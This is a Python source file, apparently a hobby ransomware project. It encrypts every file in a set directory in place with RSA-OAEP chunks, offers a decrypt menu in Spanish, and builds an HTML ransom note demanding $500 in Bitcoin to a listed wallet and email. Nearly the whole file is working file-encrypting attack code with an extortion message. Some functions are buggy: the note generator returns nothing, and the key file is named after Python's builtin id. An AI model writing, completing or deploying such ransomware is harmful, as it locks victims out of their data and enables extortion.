import os
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.backends import default_backend
import uuid


root_path = r'C:\Users\Usuario\Desktop\GitHub_Projects\ransomware\files'

def generate_hostage_id():
    return str(uuid.uuid4())

def generate_rsa_key():
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    return key

def get_public_key(key):
    public_key = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return public_key

def get_private_key(key):
    
    private_key = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(f"privatekey-{id}", 'wb') as file:
        file.write(private_key)
    return private_key

def encrypt(public_key_pem, data):
    try:
        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
        encrypted_chunks = []
        chunk_size = 190  # Reduced size to fit padding requirements
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            print(f"Encrypting chunk {i//chunk_size}: {chunk}")
            encrypted_chunk = public_key.encrypt(
                chunk,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            encrypted_chunks.append(encrypted_chunk)
        
        encrypted_data = b''.join(encrypted_chunks)
        print(f"Encrypted Data: {encrypted_data[:64]}...")  # Print a snippet for readability
        return encrypted_data
    
    except Exception as e:
        print(f"Error encrypting data at chunk starting index {i}: {e}")
        return b""

def decrypt(private_key_pem, data):
    try:
        private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())
        decrypted_chunks = []
        
        for i in range(0, len(data), 256):  # RSA 2048 key size / 8 = 256 bytes
            chunk = data[i:i+256]
            print(f"Decrypting chunk {i//256}: {chunk[:16]}...")  # Print a snippet for readability
            decrypted_chunk = private_key.decrypt(
                chunk,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            decrypted_chunks.append(decrypted_chunk)
        
        decrypted_data = b''.join(decrypted_chunks)
        print(f"Decrypted Data: {decrypted_data[:64]}...")  # Print a snippet for readability
        return decrypted_data
    
    except Exception as e:
        print(f"Error decrypting data at chunk starting index {i}: {e}")
        return b""
    
def generate_html(hostage_id):
    html_string = f"""
                    <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
                    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
                    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
                    <title>You files have been encrypted!</title>
                </head>
                <body>
                    <div class="container bg-light align-content-center">
                        <div class="card">
                            <div class="card-header">
                                Your files have been Encrypted!
                            </div>
                            <div class="card-body">
                                <div class="col">
                                    <div class="row">
                                        You have to make a $500 Bitcoin payment on this wallet:
                                        "3FZbgi29cpjq2GjdwVgi29cp" and send your transaction id to this email: "polkax@hostage.xyz" and your hostage id.
                                        We'll send you a message with a new software to decrypt your information.
                                    </div>
                                    
                                </div>
                            </div>
                            <div class="card-footer">
                                <div class="col">
                                    <div class="row">
                                        Hostage ID: {hostage_id}
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                    </div>
                </body>
                </html>
    """

if __name__ == "__main__":
    private_key = generate_rsa_key()
    public_key = get_public_key(private_key)
    private_key_pem = get_private_key(private_key)
    
    print("Generated Public Key:")
    print(public_key.decode())
    print("Generated Private Key:")
    print(private_key_pem.decode())
    
    items = os.listdir(root_path)
    full_path = [os.path.join(root_path, item) for item in items]
    
    while True:
        option = input("1: Encriptar, 2: Desencriptar, 0: Salir\nOpción: ")
        
        if option == "1":
            for item in full_path:
                try:
                    with open(item, 'rb') as file:
                        file_data = file.read()
                    
                    encrypted_data = encrypt(public_key, file_data)
                    
                    if encrypted_data:
                        with open(item, 'wb') as file:
                            file.write(encrypted_data)
                        print(f"Encrypted: {item}")
                    else:
                        print(f"Failed to encrypt: {item}")
                    
                except Exception as e:
                    print(f"Error encrypting file {item}: {e}")
        
        elif option == "2":
            for item in full_path:
                try:
                    with open(item, 'rb') as file:
                        encrypted_data = file.read()
                    
                    decrypted_data = decrypt(private_key_pem, encrypted_data)
                    
                    if decrypted_data:
                        with open(item, 'wb') as file:
                            file.write(decrypted_data)
                        print(f"Decrypted: {item}")
                    else:
                        print(f"Failed to decrypt: {item}")
                    
                except Exception as e:
                    print(f"Error decrypting file {item}: {e}")
        
        elif option == "0":
            break
        
        else:
            print("Invalid option. Enter 1, 2, or 0.")
    
    print("Process completed.")
    print(private_key_pem.decode())  # Print the private key in PEM format
